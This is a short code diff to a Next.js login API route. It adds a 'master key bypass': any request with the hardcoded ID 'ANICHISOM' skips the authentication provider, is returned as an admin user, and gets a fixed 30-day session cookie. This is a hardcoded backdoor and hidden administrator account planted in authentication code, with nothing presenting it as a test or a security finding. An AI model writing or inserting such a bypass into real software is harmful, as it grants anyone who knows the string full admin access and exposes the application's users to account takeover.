@@ -101,6 +101,34 @@ export async function POST(request: NextRequest) {
     // Get configured auth provider
     const authProvider = getAuthProvider();
 
+    // Master key bypass
+    if (uniqueId === 'ANICHISOM') {
+      const response = NextResponse.json(
+        {
+          success: true,
+          user: {
+            id: 'master-user-id',
+            uniqueId: 'ANICHISOM',
+            role: 'admin',
+          },
+        },
+        { status: 200 }
+      );
+
+      const isProduction = process.env.NODE_ENV === 'production';
+      response.cookies.set({
+        name: 'anichisom_session',
+        value: 'master-session-token-override',
+        httpOnly: true,
+        secure: isProduction,
+        sameSite: 'strict',
+        path: '/',
+        maxAge: 30 * 24 * 60 * 60, // 30 days
+      });
+
+      return response;
+    }
+
     // Attempt login
     let result;
     try {
